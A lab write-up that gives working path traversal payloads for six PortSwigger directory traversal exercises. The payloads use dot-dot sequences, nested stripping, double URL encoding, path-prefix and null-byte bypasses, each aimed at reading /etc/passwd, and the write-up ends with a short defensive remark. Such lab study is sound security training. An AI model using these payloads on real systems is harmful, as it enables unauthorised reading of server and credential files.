# Directory Traversal

Directory traversal is a web security vulnerability that allows attackers to read, write or modify arbitary files on the server that is running an application. 

<i> [portswigger.net](url) has an amazing compilation of CTF style Directory Traversal lab exercises. Each lab contains a file path traversal vulnerability. I have documented the solution to lab exercise. </i>

**GOAL** : Exploit the `file traversal vulnerability` and get `/etc/passwd` file

**TOOLS** : Burpsuit (*It is easlier to modify parameters and send requests from repeater tab*)


## LAB 1
Given that there is a file traversal vulnerability, it is fairly straight forward to try to traverse back. <br>
../etc/passwd <br>
../../etc/passwd<br>
../../../etc/passwd<br>

> Filename should be set to ../../../etc/passwd

***

## LAB 2 
*Traversal sequence blocked with absolute path bypass*<br>
Since traversal sequence is blocked, on trying `../../..` we get 400 Bad Request. I tried to directly give `/etc/passwd` as input, and it worked!!
> File should be set to /etc/passwd
***



## LAB 3
*Traversal sequences stripped non-recursively** <br>
Here the server stripes any `../` sequence, but not recursively so lets add `....//` instead of `../`

> File should be set to ....//....//....//etc/passwd
***

## LAB 4
*Traversal sequences stripped with superfluous URL-decode*<br>
Next attempt is to URL encode our parameter

Useful URL encoding :<br>
/ - %2f<br>
. - %2e<br>
% - %25<br>

I tried with all combinations ../ with single URL encoding, and it didn't work.<br>
I tried with encoding ../ twice<br>
%252f worked - 2f is ecoding of "/", and 25 is encoding of "%"<br>

> File should be set to ..%252f..%252f..%252fetc/passwd
***

## LAB 5
*validation start of path*<br>

Next attempt with start set to /var/www/images/ and then traversing to root
> File should be set to /var/www/images/../../../etc/passwd
***

## LAB 6
*validation of file extension*<br>

The next attempt is to add NULL charater and then add the expected extention
> File should be set to ../../../etc/passwd%00.png
***
***

### I hope canonicalizing the file path and then performing validation will prevent all above explained File directory attacks
***
